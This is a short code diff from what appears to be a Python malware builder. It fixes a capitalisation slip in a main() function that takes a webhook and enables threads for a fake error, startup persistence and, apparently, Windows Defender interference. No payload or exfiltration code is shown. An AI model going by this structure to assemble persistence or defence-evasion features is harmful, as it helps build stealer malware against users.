@@ -20,7 +20,7 @@ def main(webhook: str):
     threads = []
 
     if __CONFIG__["fakeerror"]:
-        threads.append(fakeerror)
+        threads.append(Fakeerror)
     if __CONFIG__["startup"]:
         threads.append(Startup)
     if __CONFIG__["defender"]:
